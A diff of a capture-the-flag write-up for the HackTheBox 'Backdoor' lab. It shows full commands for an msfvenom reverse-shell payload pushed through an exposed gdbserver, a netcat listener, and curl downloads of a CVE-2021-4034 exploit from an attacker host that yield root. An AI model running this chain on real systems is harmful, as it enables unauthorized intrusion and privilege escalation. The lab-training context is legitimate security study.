@@ -80,27 +80,29 @@ PID: 815        ../../../../../../../proc/815/cmdline../../../../../../../proc/8
 w.close()</script>
 ```
 
-By looking at the results we find these two `bin/sh while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done` and `/bin/sh while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done`. The screen -dmS could be a possible privesc route later, but for now it seems like it opens the 1337 port ever once in a while nad connects that to gdb server. So now we know what program we need to connect to it!
+By looking at the results we find these two `bin/sh while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done` and `/bin/sh while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done`. The screen -dmS could be a possible privesc route later, but for now it seems like it lets gdb set up a listener on port 1337. So now we know what program we need to connect to it!
 
 # The exploit for initial foodhold
+For those who don't know, gdb is the Gnu project debugger. The program lets you attach other programs to it and offers tools to read out the memory registers and what kind of operations are being sent to the processer on a assembly level. It also has functionality to allow debugging over network. So my guess here is that they set up a gdb server to let others remotely debug programs. How this can be abused though is by creating a malicious payload and letting the debugger run that code. The entire purpose of the debugger is to run code, so this should be relativly easy. A word of caution though, create your payload to resemble the target operating system and you should give it a unique name. If not your initial foothold could be overwritten by others or your code will not run at all. We know it's a linux system through the nmap scan, so this should be easy to pass on to the metasploit framework. For more detailed steps or information, please check out theese two links.
 https://sourceware.org/gdb/onlinedocs/gdb/Server.html
 https://book.hacktricks.xyz/pentesting/pentesting-remote-gdbserver
-```
-msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o binary.elf
-chmod +x binary.elf
-gdb binary.elf
+So lets create the payload
+```bash
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 PrependFork=true -f elf -o plsRunMe.elf
+chmod +x plsRunMe.elf
+gdb plsRunMe.elf
 # Set remote debuger target
 target extended-remote 10.10.10.11:1337
 # Upload elf file
-remote put binary.elf binary.elf
+remote put plsRunMe.elf plsRunMe.elf
 # Set remote executable file
-set remote exec-file /home/user/binary.elf
+set remote exec-file /home/user/plsRunMe.elf
 # Execute reverse shell executable
 run
 ```
 ```
 (gdb) target extended-remote 10.10.11.125:1337
-`target:/home/user/binary.elf' has disappeared; keeping its symbols.
+`target:/home/user/plsRunMe.elf' has disappeared; keeping its symbols.
 Remote debugging using 10.10.11.125:1337
 Reading /lib64/ld-linux-x86-64.so.2 from remote target...
 Reading /lib64/ld-linux-x86-64.so.2 from remote target...
@@ -112,78 +114,92 @@ Reading /usr/lib/debug/lib64//ld-2.31.so from remote target...
 Reading target:/usr/lib/debug/lib64//ld-2.31.so from remote target...
 (No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
 0x00007ffff7fd0100 in ?? () from target:/lib64/ld-linux-x86-64.so.2
-(gdb) remote put binary.elf binary.elf
-Successfully sent file "binary.elf".
-(gdb) set remote exec-file /home/user/binary.elf
+(gdb) remote put plsRunMe.elf plsRunMe.elf
+Successfully sent file "plsRunMe.elf".
+(gdb) set remote exec-file /home/user/plsRunMe.elf
 (gdb) run
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
-`target:/home/user/binary.elf' has disappeared; keeping its symbols.
+`target:/home/user/plsRunMe.elf' has disappeared; keeping its symbols.
 Starting program:  
-Reading /home/user/binary.elf from remote target...
-Reading /home/user/binary.elf from remote target...
-Reading symbols from target:/home/user/binary.elf...
-(No debugging symbols found in target:/home/user/binary.elf)
-┌──(kali㉿kali)-[~/Documents/HTB/Backdoor]                                                                                                                                                                                                  
-└─$ nc -nvlp 6969                                                                                                                                                                                                                           
-listening on [any] 6969 ...                                                                                                                                                                                                                 
-                                                                                                                                                                                                                                            
-ls                                                                                                                                                                                                                                          
-whoami                                                                                                                                                                                                                                      
-ls                                                                                                                                                                                                                                          
-ls                                                                                                                                                                                                                                          
-ls                                                                                                                                                                                                                                          
-connect to [10.10.14.231] from (UNKNOWN) [10.10.11.125] 38176                                                                                                                                                                               
-binary.elf
-revshell.elf
-user.txt
-user
-binary.elf
-revshell.elf
-user.txt
-binary.elf
-revshell.elf
-user.txt
-binary.elf
-revshell.elf
-user.txt
-ls
+Reading /home/user/plsRunMe.elf from remote target...
+Reading /home/user/plsRunMe.elf from remote target...
+Reading symbols from target:/home/user/plsRunMe.elf...
+(No debugging symbols found in target:/home/user/plsRunMe.elf)
 
+----------------------------------------------
+
+#Our reverse shell
+┌──(kali㉿kali)-[~/Documents/HTB/Backdoor]
+└─$ nc -nvlp 6969
+listening on [any] 6969 ...
+connect to [10.10.14.231] from (UNKNOWN) [10.10.11.125] 38176 
+
+ls
+plsRunMe.elf
+revshell.elf
+user.txt
+
+whoami
+user
+
+#Success we got shell, but it kind of sucks, so lets spawn a better shell via python
 /usr/bin/python3 -c 'import pty; pty.spawn("/bin/sh")'
+$
+#Good enough
 ```
+
 # Privesc enumeration
-```
+Allright, so we have shell, so here are my standard steps I do when I get shell:
+- Whoami?
+- Whats in the `/home/user/` directory?
+- Is there any hashed passwords hashed in the `/etc/passwd` and can I edit it?
+- Is there any silly setuid files?
+- Transfer and run linpeas.sh
+
+There are other things I would check but I'm far to lazy, if the first 4 don't yield anything interesting, I'm going to go for linpeas and automate the enumeration. Linpeas checks all this, but I find it easier to just use those two minutes first to check for the obvious ones.
+To save you the time, there was nothing particulary interesting, the screen output from earlier is a possible vector but I wasn't really sure how that would work. The output from linpeas showed me that the sudo version was vulnerable, and I have previously successfully used this specific privesc code before. It was easier than finding the syntax for screen.
+```bash
+# The screen process that was being created every one second.
 root         809  0.0  0.0   2608  1652 ?        Ss   11:47   0:14      _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root ;; done
 
-╔══════════╣ Sudo version                                                                                                                                                                                                                   
-╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                                                                                                  
-Sudo version 1.8.31                                                                                                                                                                                                                         
-                                                                                                                                                                                                                                            
+#The output from linpeas
+╔══════════╣ Sudo version 
+╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.8.31
 Vulnerable to CVE-2021-4034 
 ```
+
 # Privesc
+So googling the cve gave me a code from this github page: https://www.exploit-db.com/exploits/50689
+
+It had three files, evil-so.c, exploit.c and makefile. Just transfer the three and you're good to go.
+
 ```
-$ curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c                                                                                                                                                                                     
-curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c                                                                                                                                                                                       
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                                                             
-                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                                                               
-100   172  100   172    0     0    873      0 --:--:-- --:--:-- --:--:--   873                                                                                                                                                              
-$ curl http://10.10.14.231:8000/exploit.c -o exploit.c                                                                                                                                                                                      
-curl http://10.10.14.231:8000/exploit.c -o exploit.c                                                                                                                                                                                        
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                                                             
-                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                                                               
-100   555  100   555    0     0   2747      0 --:--:-- --:--:-- --:--:--  2747                                                                                                                                                              
-$ curl http://10.10.14.231:8000/makefile -o makefile                                                                                                                                                                                        
-curl http://10.10.14.231:8000/makefile -o makefile                                                                                                                                                                                          
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                                                             
-                                 Dload  Upload   Total   Spent    Left  Speed                                                                                                                                                               
-100   148  100   148    0     0    740      0 --:--:-- --:--:-- --:--:--   740                                                                                                                                                              
-$ make                                                                                                                                                                                                                                      
-make                                                                                                                                                                                                                                        
+$ curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c
+curl http://10.10.14.231:8000/evil-so-.c -o evil-so.c
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   172  100   172    0     0    873      0 --:--:-- --:--:-- --:--:--   873
+$ curl http://10.10.14.231:8000/exploit.c -o exploit.c
+curl http://10.10.14.231:8000/exploit.c -o exploit.c
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   555  100   555    0     0   2747      0 --:--:-- --:--:-- --:--:--  2747
+$ curl http://10.10.14.231:8000/makefile -o makefile
+curl http://10.10.14.231:8000/makefile -o makefile
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   148  100   148    0     0    740      0 --:--:-- --:--:-- --:--:--   740
+$ make                                 
+make
 /bin/sh: 15: make: not found
-$ curl http://10.10.14.231:8000/exploit -o exploit                                                                                                                                                                                          
-curl http://10.10.14.231:8000/exploit -o exploit                                                                                                                                                                                            
-  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                                                                                                                                             
+```
+Seriously? Make isn't installed, ohh well, lets just transfer the finished product. So I make it on my kali client and just transfer it.
+```
+$ curl http://10.10.14.231:8000/exploit -o exploit
+curl http://10.10.14.231:8000/exploit -o exploit
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                  Dload  Upload   Total   Spent    Left  Speed
 100 16176  100 16176    0     0  53562      0 --:--:-- --:--:-- --:--:-- 53562
 $ curl http://10.10.14.231:8000/evil.so -o evil.so
@@ -196,5 +212,5 @@ $ ./exploit
 # whoami
 whoami
 root
-
 ```
+:space_invader:
